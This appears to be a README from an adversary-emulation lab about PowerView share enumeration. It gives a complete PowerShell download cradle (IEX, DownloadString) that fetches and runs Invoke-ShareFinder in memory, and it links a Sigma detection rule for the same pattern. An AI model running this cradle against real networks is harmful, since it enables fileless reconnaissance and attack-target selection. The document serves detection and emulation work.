# Share enumeration with PowerView

`Invoke-ShareFinder` runs from PowerShell with the same SYSTEM ancestry as discovery. The script is
not written to disk: a cradle pulls PowerView from a local staging endpoint and pipes it into
`Invoke-ShareFinder`, which checks share access and writes the result to `C:\ProgramData`.

```
powershell.exe -c "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:<port>/'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt"
```

The output file is the operator's map of the estate. It is what turns a list of hosts into a target
choice: the backup server appears with readable administrative and backup shares.

## How the lab reproduces it

The staging endpoint is the lab HTTP server instead of a loopback listener owned by the C2, so the
cradle URL differs in host and port while the command shape is preserved: `IEX`, `DownloadString`,
`Invoke-ShareFinder -CheckShareAccess`, `Out-File -Encoding ascii`, same output path.

`tools/invoke-sharefinder.ps1` issues the command inside the winlogon session and captures the exit
state. The first version of the lab used `net view` and `Get-SmbShare`; the current version runs the
PowerView function so that the script block log contains the same function name as the campaign.

The lab AD is populated with enough shares and groups for the output to be non-trivial. An empty
directory returns an empty file, which would make the target-selection step impossible to exercise.

## Artifacts

| File | Purpose |
|---|---|
| `tools/invoke-sharefinder.ps1` | Runs the cradle and the enumeration with the campaign flags |

## Telemetry and detection

Expected events are listed in [`telemetry/README.md`](telemetry/README.md). The rule
[`detection_rules/sigma/powerview-sharefinder-cradle.yml`](detection_rules/sigma/powerview-sharefinder-cradle.yml)
matches a PowerShell command line that contains both a download cradle and `Invoke-ShareFinder`.
Script block logging provides the same signal with the full function body.
